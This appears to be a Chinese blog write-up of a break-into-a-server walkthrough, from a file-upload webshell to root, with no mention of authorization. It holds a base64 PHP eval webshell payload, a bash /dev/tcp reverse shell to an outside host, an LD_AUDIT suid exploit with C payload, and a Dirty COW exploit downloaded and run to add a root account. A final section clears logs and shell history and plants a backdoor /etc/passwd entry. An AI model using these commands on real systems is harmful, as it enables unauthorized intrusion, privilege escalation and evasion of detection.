---
title: '记:从文件上传漏洞到获得root权限'
tags: []
id: '400'
categories:
  - - linux
date: 2018-04-18 10:02:05
---

## 1.信息搜集

1.  nmap扫描得到 21/tcp open ftp vsftpd 2.2.2 22/tcp open ssh OpenSSH 5.3 (protocol 2.0) 80/tcp open http Apache httpd 2.4.12 ((Unix) OpenSSL/1.0.1e-fips) 3306/tcp open mysql MySQL 5.6.26-log
2.  nessus 扫描没什么可利用
3.  通过旁站扫描没有发现旁站，子域名也未查询到，通过Googlehack发现子目录下有其他站点。
4.  浏览主站，脚本语言应该是php，使用了框架。
5.  有phpmyadmin管理页面

## 2\. web漏洞利用

1.  主站是一个类似于商城的系统，提供注册登录功能。先尝试了sql注入，没有效果，技艺不精。
2.  然后注册是提供头像上传的，于是选择一个图片上传抓包发现前端将图片重绘后使用base64格式上传。尝试修改数据包，将php一句话base64编码后替换原数据上传,  个人信息页面头像处拿到地址，成功拿到webshell
    
    ```
    格式：data:[<mediatype>][;base64],<data>
    图片文件格式：data:image/jpeg;base64,<base64data>
    
    构造后：data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk/Pg==
    //PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk/Pg== 是<?php @eval($_POST['cmd'])?> 的base64编码形式
    ```
    
3.  利用注册的账号登录进去，发现里面仍然提供更换照片功能。再次抓包发现是直接上传文件的方式。（非base64编码后上传）
4.  前端做了验证只能上传图片类型文件，上传jpg后缀一句话木马，使用burpsuit拦截后修改文件名后缀为php，成功上传。回到个人信息页面得到php一句话木马地址。使用菜刀连接上得到webshell

## 3.提权

1.  提权过程试了好几种方法。使用反向连接得到webshell，得到内核版本等信息
    
    ```
    #公网服务器使用nc监听
    nc -lvvp 1234
    #目标机器上执行命令 
    bash -i >& /dev/tcp/公网服务器IP/端口 0>&1
    ```
    
    ```
    [www@centos]$ whoami
    www
    [www@centos]$ uname -a
    uname -a
    Linux centos 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
    [www@centos]$ lsb_release -a
    lsb_release -a
    LSB Version::base-4.0-amd64:base-4.0-noarch:core-4.0-amd64:core-4.0-noarch:graphics-4.0-amd64:
    graphics-4.0-noarch:printing-4.0-amd64:printing-4.0-noarch
    Distributor ID:CentOS
    Description:CentOS release 6.5 (Final)
    Release:6.5
    Codename:Final
    [www@centos]$ python -c 'import pty;pty.spawn("/bin/sh")' #模拟tty
    ```
    
2.  首先尝试了mysql的udf提权，恰好3306端口也是开放的。直接使用了sqlmap
    
    ```
    sqlmap -d mysql://root:<passwd>@IP:PORT/DBname --os-shell
    #然后选择操作系统位数
    ```
    
    然而并未成功，使用ps aux查看发现mysql是以mysql用户启动的，没有权限写plugin目录
3.  然后尝试利用/tmp结合ping提权（suid）
    
    ```
    find / -user root -perm -4000 -print 2>/dev/null   #查找具有suid权限的文件
    cd /tmp
    mkdir exploit
    ln /bin/ping /tmp/exploit/target
    exec 3< /tmp/exploit/target#把/tmp/exploit/target定义为文件描述符3
    rm -rf /tmp/exploit/
    #建立payload.c
    **********************************************
    void __attribute__((constructor)) init()
    {
         setuid(0);
         system("/bin/bash");
    }
    ***********************************************
    
    gcc -W -fPIC -shared -o /tmp/exploit payload.c
    LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3  #定义环境变量
    ```
    
    但是不知道为什么前面所有的都执行正常 ，最后一句执行完后连接直接断开了，无奈换其他方法。
4.  使用“Dirty COW”漏洞exp提权
    
    ```
    [www@centos tmp]$ curl https://www.exploit-db.com/download/40839 > exp.c  #下载exp代码
    <$ curl https://www.exploit-db.com/download/40839 > exp.c                    
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  5006  100  5006    0     0   3768      0  0:00:01  0:00:01 --:--:--  6476
    [www@centos tmp]$ gcc -pthread exp.c -o exp -lcrypt  #编译
    gcc -pthread exp.c -o exp -lcrypt
    [www@centos tmp]$ ./exp   #执行
    ./exp
    Please enter the new password: testtest   #输入密码，用户名默认firefart
    /etc/passwd successfully backed up to /tmp/passwd.bak
    Complete line:
    firefart:fiJIjOetSxcCE:0:0:pwned:/root:/bin/bash
    
    mmap: **********
    ptrace 0
    Done! Check /etc/passwd to see if the new user was created.
    You can log in with the username 'firefart' and the password 'testtest'.
    
    
    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd  #通过在etc/passwd下添加ROOT权限的用户
    ```
    
5.  然后使用ssh工具成功登上
    
    ```
    [firefart@centos ~]# id
    uid=0(firefart) gid=0(root) groups=0(root)
    [firefart@centos ~]#
    ```
    

## 4.清理及其他

1.  清理登录信息 等日志
    
    ```
    #清理其他记录日志
    access_log  error_log
    echo > /var/log/wtmp
    echo > /var/log/btmp
    echo >~/.bash_history
    history -c 
    
    使用sudo可用
    for i in `find . -name "*log*"`; do cat /dev/null >$i; done
    sudo cp /dev/null > .bash_history
    
    find a -exec echo "test:fiJIjOetSxcCE:34:0:pwned:/root:/bin/bash">>/etc/passwd \; #给find设置suid提权创建用户
    ```